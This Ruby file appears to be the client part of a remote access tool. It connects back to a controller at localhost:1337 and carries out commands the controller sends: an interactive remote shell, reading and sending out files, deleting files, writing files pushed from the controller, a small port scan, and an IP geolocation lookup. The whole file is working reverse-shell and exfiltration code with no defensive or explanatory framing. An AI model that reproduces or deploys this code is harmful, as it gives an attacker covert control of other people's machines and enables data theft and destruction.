require 'socket'
require 'net/http'
require 'json'
require 'open3'

class Client
	def initialize(hostname, port)
		@hostname = hostname
		@port = port

		self.run
	
	end

	def run
		@s = TCPSocket.open(@hostname, @port)
		@s.puts(Dir.pwd)
		
		loop do
			command = @s.recv(4096).gsub("\n","")
			puts command

			case command

			when "ls"
				self.ls

			when "ipinfo"
				self.ipinfo

			when "shell"
				self.shell

			when "showfile"
				self.showfile

			when "portscan"
				self.portscan

			when "delete"
				self.delete

			when "upload"
				self.upload

			when "download"
				self.download

			when "changedir"
				self.changedir

			else
				nil
			end
					
		end
		
		@s.close 
	
	end

	def ipinfo
		url = 'https://ipinfo.io/json'
		uri = URI(url)
		
		response = Net::HTTP.get(uri)
		json = JSON.parse(response)

		infoip = "#===========================#"
		infoip += "\n   IP : "+json['ip']
		infoip += "\n   City : "+json['city']
		infoip += "\n   Region : "+json['region']
		infoip += "\n   Country: "+json['country']
		infoip += "\n#===========================#"

		@s.puts(infoip)

	end

	def shell
		path = Dir.pwd
		@s.puts(path)
		
		loop do
			command = @s.recv(4096).gsub("\n","")

			break if command == "leave"
			stdout, error, status = Open3.capture3("cd #{path} && #{command}")

			if status.success?
				if stdout == ""
					if command[0..2] == "cd "
						if Dir.exist?("#{path}/#{command[3..command.size]}")
							
							if command[3, command.size] == ".."
								path2 = (path.split('/'))
								path = path2[0, path2.size-1].join('/')
								@s.puts "" << "\n" << path
							
							else
								inst = command[3, command.size]
								path = "#{path}/#{inst}"
								@s.puts "" << "\n" << path
							end
							
						else
							@s.puts "invalid path : #{command[3..command.size]}" << "\n" << path
						end
					
					else
						@s.puts "" << "\n" << path
					end
				
				else
					@s.puts stdout << "\n" << path
				end
				
			else
				@s.puts error << "\n" << path
			
			end
		end
	end

	def showfile
		@s.puts "\033[31mFile    ╘═ \033[34m~#\033[00m "
		filename = @s.recv(4096).gsub("\n","")
		
		if File.file?(filename)
			file = File.open(filename, "r")
			data = file.read
			file.close

			@s.puts data
		
		else
			@s.puts filename << " is invalid"
		end

	end

	def portscan # a revoir
		@s.puts "\033[31mTarget  ╘═ \033[34m~#\033[00m "
		target = @s.recv(4096).gsub("\n","")
		ports = []
		
		for port in 1..10 do
			puts port
			begin
				socket = TCPSocket.new(target, port)
				ports.push(port)
			
			rescue Errno::ECONNREFUSED, Errno::ETIMEDOUT
				nil			
			end
		end

		@s.puts ports
	end

	def delete
		@s.puts "\033[31mFile    ╘═ \033[34m~#\033[00m "
		filename = @s.recv(4096).gsub("\n","")
		
		if File.exist?(filename)
			File.delete(filename)
			@s.puts filename << " is delete"
		
		else
			@s.puts filename << " is invalid"
		end 

	end

	def upload
		@s.puts "\033[31mFile    ╘═ \033[34m~#\033[00m "
		filename = @s.recv(4096).gsub("\n","")
		
		if File.file?(filename)
			file = File.open(filename, "rb")
			data = file.read
			file.close

			@s.puts data
		
		else
			@s.puts filename << " is invalid"
		end

	end

	def download
		@s.puts "\033[31mFile    ╘═ \033[34m~#\033[00m "
		filename = @s.recv(4096).gsub("\n","")
		@s.puts "#{filename} is select"
		data = ""
		
		loop do
			data = @s.recv(50000)
			file = File.open(filename, 'ab')
			file << data
			file.close
			
			break if data.length < 50000
		end
		
	end

	def changedir
		@s.puts "\033[31mCD      ╘═ \033[34m~#\033[00m "
		newdir = @s.recv(4096).gsub("\n","")
		
		if Dir.exist?(newdir)
			if newdir.chars.last(2).join == ".."
				newdir = (newdir.split('/'))
				newdir = newdir[0, newdir.size-2].join('/')

				@s.puts newdir
							
			else
				@s.puts newdir
			end
		
		else
			@s.puts "invalid path"
		end
	end

	def ls
		@s.puts "{========================================================}"
		path = @s.recv(4096).gsub("\n","")
		files = Dir.entries(path)
		@s.puts files
	end
end

if __FILE__ == $0
	Client.new(%q[localhost], 1337)
end
